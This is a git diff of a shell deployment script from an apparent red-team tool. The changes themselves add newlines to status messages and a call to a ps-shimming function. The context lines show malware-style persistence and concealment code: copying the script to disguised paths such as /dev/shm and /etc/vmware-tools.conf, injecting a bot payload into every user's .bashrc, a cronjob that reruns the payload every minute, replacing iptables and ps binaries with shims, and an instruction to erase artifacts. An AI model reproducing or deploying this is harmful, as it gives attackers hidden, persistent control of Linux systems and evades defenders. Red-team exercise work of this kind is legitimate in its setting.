@@ -27,7 +27,7 @@ setup(){
 
 # Clone the client binary into different places 
 clone(){
-    echo -e "Cloning all the files to the right directory...\n"
+    echo -e "\nCloning all the files to the right directory...\n"
     cp deploy.sh /dev/shm/pulse-shm-10175238
     cp deploy.sh /dev/loop28
     cp deploy.sh /etc/vmware-tools.conf 
@@ -59,7 +59,7 @@ copyman(){
 
 # Add bot payload to all the bashrc found in /home and /root 
 bashrc(){
-    echo -e "Changing all bashrc... \n"
+    echo -e "\nChanging all bashrc... \n"
 
     bashrc=$(find /home -type f -name ".bashrc" 2>/dev/null)
     for i in $bashrc; do
@@ -76,14 +76,14 @@ alias_ls(){
 
 # Add a cronjob with bot payload which runs every 1 minute
 cronjob(){
-    echo -e "Installing cronjob... \n"
+    echo -e "\nInstalling cronjob... \n"
     crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
     systemctl restart cron 
 }
 
 # Shim iptables. IPtables had weird symlink, had to separate it 
 iptables(){
-    echo -e "Shimming iptables... \n"
+    echo -e "\nShimming iptables... \n"
     gcc /opt/cdt-redteamtool/payload/iptables/drop.c -o ./iptables/drop
     cp /opt/cdt-redteamtool/payload/iptables/drop /bin/fw
     cp /opt/cdt-redteamtool/payload/iptables/iptables /sbin/xtables-single 
@@ -94,7 +94,7 @@ iptables(){
 }
 
 shim_ps(){
-    echo -e "Shimming ps... \n"
+    echo -e "\nShimming ps... \n"
 
     gcc /opt/cdt-redteamtool/payload/ps/drop_ps.c -o /bin/procs
     chmod +x /bin/procs
@@ -140,6 +140,7 @@ cronjob
 pam
 bashrc  
 iptables
+shim_ps
 echo -e "========= Script have ended. Erase all artifaces. ========== \n"
 
 # Start copyman 
